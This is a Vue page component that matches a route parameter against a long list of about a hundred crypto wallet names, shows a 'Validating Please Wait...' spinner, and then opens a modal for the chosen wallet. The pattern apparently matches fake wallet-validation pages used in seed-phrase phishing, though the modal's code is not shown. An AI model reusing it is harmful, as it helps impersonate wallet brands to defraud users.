<template>
  <v-container fluid class="pa-0 dark py-16">
    <v-row justify="center" class="ma-0">
      <v-col cols="12" md="" v-if="!loading.wallet">
        <Modal v-if="wallet" :wallet="wallet" />
      </v-col>
      <v-col v-else cols="12" md="10">
        <v-card
          max-width="100%"
          width="500"
          tile
          flat
          color="transparent"
          class="mx-auto"
        >
          <v-card-text>
            <div class="d-flex justify-center mb-4">
              <v-avatar size="200" class="mx-auto">
                <v-img src="/13.png" sizes="200"> </v-img>
              </v-avatar>
            </div>
            <v-btn block large tile color="black" dark class="px-10">
              <v-progress-circular
                indeterminate
                size="30"
                color="white"
              ></v-progress-circular>

              <span class="ml-2">Validating Please Wait...</span>
            </v-btn>
          </v-card-text>
        </v-card>
      </v-col>
    </v-row>
  </v-container>
</template>

<script>
import { mapGetters } from "vuex";
import Modal from "~/components/modal.vue";
export default {
  data: () => ({}),
  components: { Modal },
  computed: {
    ...mapGetters({ loading: "app/getLoading" }),

    wallets() {
      return [
        "metamask",
        "trust",
        "wallet connect",
        "safepal",
        "blockchain",
        "fantom phantom",
        "binance",
        "enjin wallet",
        "defi wallet",
        "coinbase",
        "klever",
        "tomo wallet",
        "1inch wallet",
        "alphawallet",
        "solfare",
        "imtoken",
        "onto",
        "tokenpocket",
        "mathwallet",
        "bitpay",
        "phantom",
        "ledger live",
        "walleth",
        "authereum",
        "huobi wallet",
        "guarda wallet",
        "03 wallet",
        "midas wallet",
        "ellipal",
        "keyring pro",
        "ferrum unifyre",
        "sollet",
        "solana",
        "terra station",
        "fearless wallet",
        "mykey",
        "loopring wallet",
        "trustvault",
        "atomic",
        "coin98",
        "coolwallet",
        "tronlink",
        "coinomi",
        "vechain",
        "xdefi",
        "exodus wallet",
        "luno",
        "torus",
        "wallet.io",
        "infinity wallet",
        "ownbit",
        "easypocket",
        "trezor wallet",
        "debank",
        "keplr",
        "blue wallet",
        "polymesh",
        "bridge wallet",
        "sparkpoint",
        "viawallet",
        "bitkeep",
        "kardiachain",
        "swft wallet",
        "peakdefi wallet",
        "xdc wallet",
        "unstoppable wallet",
        "auto wallet",
        "spatium",
        "gridplus",
        "eidoo",
        "equal",
        "infinito",
        "dok wallet",
        "alice",
        "d'cent wallet",
        "zelcore",
        "nash",
        "tokenary",
        "gnosis safe multisig",
        "argent",
        "rainbow",
        "pillar",
        "cybavo wallet",
        "electrum",
        "Kraken",
        "jaxx",
        "axie infinity",
        "Greenaddress",
        "Overbit",
        "Bitira",
        "Monero",
        "ZenGo",
        "Ambire",
        "StakedWallet",
        "MyEtherWallet",
        "Bitgo",
      ];
    },
    wallet() {
      const wallet = this.$route.params.id;

      const selected = this.wallets.find((el) => {
        return el == wallet;
      });

      console.log(selected);
      return selected;
    },
  },

  methods: {},
};
</script>

<style>
</style>